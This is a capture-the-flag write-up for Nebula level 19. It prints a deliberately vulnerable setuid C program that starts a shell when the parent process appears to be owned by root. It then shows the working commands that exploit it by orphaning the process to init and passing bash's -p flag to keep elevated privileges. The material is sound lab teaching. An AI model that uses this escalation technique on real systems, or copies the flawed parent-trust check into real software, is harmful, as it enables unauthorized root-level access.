## Challenge
There is a flaw in the below program in how it operates.

## Solution
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) {
      printf("Unable to check parent process\n");
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```
Program flow:
* construct path to parent process's directory in `/proc`
* retrieve directory's `stat` structure
* check if owner uid equals to `0` (root)
  * execute `/bin/sh` with given arguments

Ideas for exploitation:
* schedule a `cron` job to run the process (`cron` is a root owned daemon) ❌
  * `cron` executes commands using a user owned shell, thus the parent of our process will not be root `cron`.
* kill the parent process, cause child to move to a new parent - root `init` process ✔
  * race condition, parent should be killed before child executes critical code parts

### Init Parent Process
I found that executing `sh -c 'COMMAND &'` will cause the wanted effect.
```console
level19@nebula:/home/flag19$ sh -c './flag19 -c "echo hello world"&'
level19@nebula:/home/flag19$ hello world
```

But there is a problem with this solution,
```console
level19@nebula:/home/flag19$ sh -c './flag19 -c "id" &'
level19@nebula:/home/flag19$ uid=1020(level19) gid=1020(level19) groups=1020(level19)
```
We are not running as `flag19`...

### Running as `flag19`
As we already learned from this series of challenges, `man` is a good friend.
```console
level19@nebula:~$ man bash
```
> If  the  shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to  the  real user id.  If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.

We start `bash` with an effective user id of `flag19` (because `setuid` binary) and a real user id of `level19` (the user that executed the program), and this explains why our effective user id resets to the real user id. We shall use the `-p` flag to avoid this behavior.

```console
level19@nebula:~$ sh -c '/home/flag19/flag19 -c "id" &'
level19@nebula:~$ uid=1020(level19) gid=1020(level19) groups=1020(level19)
level19@nebula:~$ sh -c '/home/flag19/flag19 -p -c "id" &'
level19@nebula:~$ uid=1020(level19) gid=1020(level19) euid=980(flag19) groups=980(flag19),1020(level19)
```
```console
level19@nebula:~$ sh -c '/home/flag19/flag19 -p -c "getflag" &'
level19@nebula:~$ You have successfully executed getflag on a target account
```

### Last Words
Wow, it's really over isn't it?

I'd like to finish my writeup with a huge thank-you to the people behind exploit.education, it has been a real joyride.

Next up, Phoenix!
